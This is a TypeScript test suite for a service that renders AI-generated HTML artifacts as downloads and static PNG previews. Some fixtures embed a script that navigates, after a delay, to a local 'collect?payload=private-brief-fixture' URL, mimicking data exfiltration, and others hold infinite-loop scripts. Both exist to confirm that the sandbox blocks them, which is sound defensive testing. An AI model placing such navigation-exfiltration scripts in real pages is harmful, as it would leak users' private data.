import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { once } from 'node:events';
import { mkdtempSync, rmSync } from 'node:fs';
import { createServer } from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, type TestContext } from 'node:test';
import express from 'express';
import { chromium } from 'playwright';
import { createProductionService } from '../server/production/index.js';
import { ProductionPreview } from '../server/production/preview.js';
import { ProductionStore } from '../server/production/store.js';
import { productionRunInputSchema, type ProductionRun } from '../shared/production-schema.js';
import { PRODUCTION_DEMO_CASES } from '../shared/production-benchmarks.js';

const SAFE_HTML = '<!doctype html><html><head><title>Static preview</title></head><body><h1>Safe fixture</h1><button onclick="this.textContent=\'Done\'">Add</button></body></html>';
const PNG_HEADER = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
function addArtifact(store: ProductionStore, html: string) {
  const fixture = PRODUCTION_DEMO_CASES[0];
  const input = productionRunInputSchema.parse({ brief: fixture.brief, mode: 'demo', demoCaseId: fixture.operation, agentIds: store.agents().map(agent => agent.id), requirement: { id: fixture.id, source: fixture.source, acceptance: fixture.acceptance, kind: 'illustrative' } });
  const run: ProductionRun = { id: randomUUID(), input, status: 'completed', createdAt: new Date().toISOString(), evidenceKind: 'fixture', agentSnapshot: store.agents(), events: [], calls: [], verifications: [], outputs: [], gateHistory: [], repairs: 0, usage: { inputTokens: 0, outputTokens: 0, estimatedCost: 0, currency: 'USD', complete: true }, interventions: [], artifacts: [{ name: 'index.html', type: 'text/html' }] };
  store.addRun(run, input.agentIds); store.writeArtifact(run.id, 'index.html', html); return run;
}
async function setup(t: TestContext) {
  const directory = mkdtempSync(path.join(fileURLToPath(new URL('../', import.meta.url)), '.city-agent-preview-unit-'));
  const service = createProductionService(directory); const app = express(); app.use('/api/production', service.router);
  const server = createServer(app); server.listen(0, '127.0.0.1'); await once(server, 'listening');
  const address = server.address(); if (!address || typeof address === 'string') throw new Error('Missing preview test address');
  t.after(async () => { await service.close(); await new Promise<void>(resolve => server.close(() => resolve())); rmSync(directory, { recursive: true, force: true }); });
  return { directory, service, base: `http://127.0.0.1:${address.port}/api/production` };
}
async function captureServer(t: TestContext) {
  const hits: string[] = []; const server = createServer((req, res) => { hits.push(req.url ?? ''); res.end('capture'); });
  server.listen(0, '127.0.0.1'); await once(server, 'listening'); const address = server.address(); if (!address || typeof address === 'string') throw new Error('Missing capture address');
  t.after(async () => { await new Promise<void>(resolve => server.close(() => resolve())); });
  return { hits, url: `http://127.0.0.1:${address.port}/collect?payload=private-brief-fixture` };
}

test('raw HTML is an inert attachment with unchanged source bytes and PNG preview is a static image', async t => {
  const { service, base } = await setup(t); const run = addArtifact(service.store, SAFE_HTML);
  const response = await fetch(`${base}/runs/${run.id}/artifacts/index.html`);
  assert.equal(response.status, 200); assert.match(response.headers.get('content-type')!, /^text\/plain/); assert.match(response.headers.get('content-disposition')!, /^attachment;/); assert.equal(response.headers.get('x-content-type-options'), 'nosniff'); assert.equal(response.headers.get('content-security-policy')!.includes('allow-scripts'), false); assert.equal(await response.text(), SAFE_HTML);
  const image = await fetch(`${base}/runs/${run.id}/preview`); assert.equal(image.status, 200, await image.clone().text()); assert.equal(image.headers.get('content-type'), 'image/png'); assert.equal(image.headers.get('x-preview-mode'), 'static-image-bounded-capture'); const png = Buffer.from(await image.arrayBuffer()); assert.deepEqual(png.subarray(0, 8), PNG_HEADER); assert.ok(png.byteLength < 5_000_000);
  assert.equal((await fetch(`${base}/runs/${randomUUID()}/preview`)).status, 404);
});

test('delayed iframe self-navigation exfiltration is blocked in controlled capture, not delegated to CSP', async t => {
  const { service, base } = await setup(t); const outside = await captureServer(t);
  const html = `<!doctype html><html><title>Delayed navigation attack</title><body>Fixture<script>setTimeout(()=>location.href=${JSON.stringify(outside.url)},100)</script></body></html>`;
  const run = addArtifact(service.store, html); const response = await fetch(`${base}/runs/${run.id}/preview`); assert.equal(response.status, 400); assert.match((await response.json()).error, /网络访问|导航/); assert.deepEqual(outside.hits, []);
  const browser = await chromium.launch({ headless: true }); t.after(() => browser.close()); const page = await browser.newPage({ acceptDownloads: true }); const download = page.waitForEvent('download'); await page.goto(`${base}/runs/${run.id}/artifacts/index.html`).catch(() => undefined); await download; await page.waitForTimeout(300); assert.deepEqual(outside.hits, [], 'download route must not execute the generated source');
});

test('longer delayed external navigation cannot survive browser capture cleanup', async t => {
  const { service } = await setup(t); const outside = await captureServer(t);
  const run = addArtifact(service.store, `<!doctype html><html><title>Late attack</title><body>Fixture<script>setTimeout(()=>location.href=${JSON.stringify(outside.url)},1000)</script></body></html>`);
  const png = await service.preview.capture(run.id); assert.deepEqual(png.subarray(0, 8), PNG_HEADER); await new Promise(resolve => setTimeout(resolve, 1100)); assert.deepEqual(outside.hits, []); assert.equal(service.preview.busy, false);
});

test('single capture admission, cancellation and timeout close the renderer before the slot can be reused', async t => {
  const { service } = await setup(t); const stuck = addArtifact(service.store, '<!doctype html><html><title>Stuck renderer</title><body><script>while(true){}</script></body></html>'); const safe = addArtifact(service.store, SAFE_HTML);
  const preview = new ProductionPreview(service.store, { timeoutMs: 1000, observationMs: 100 }); t.after(() => preview.close());
  const controller = new AbortController(); const cancelled = preview.capture(stuck.id, controller.signal); const cancellation = assert.rejects(cancelled, /取消|closed|aborted/i); await assert.rejects(preview.capture(safe.id), /运行中/); setTimeout(() => controller.abort(), 200); await cancellation; assert.equal(preview.busy, false);
  const started = Date.now(); await assert.rejects(preview.capture(stuck.id), /时间|timeout|closed/i); assert.ok(Date.now() - started < 6500, 'timeout must not leave the admission slot occupied indefinitely'); assert.equal(preview.busy, false);
  assert.deepEqual((await preview.capture(safe.id)).subarray(0, 8), PNG_HEADER);
});

test('HTTP client disconnect aborts its capture and does not block a later image request', async t => {
  const { service, base } = await setup(t); const stuck = addArtifact(service.store, '<!doctype html><html><title>Stuck request</title><body><script>while(true){}</script></body></html>'); const safe = addArtifact(service.store, SAFE_HTML);
  const controller = new AbortController(); const response = fetch(`${base}/runs/${stuck.id}/preview`, { signal: controller.signal }); const rejected = assert.rejects(response, /abort/i); await new Promise(resolve => setTimeout(resolve, 100)); controller.abort(); await rejected;
  const deadline = Date.now() + 6000; while (service.preview.busy && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 30)); assert.equal(service.preview.busy, false); assert.equal((await fetch(`${base}/runs/${safe.id}/preview`)).status, 200);
});
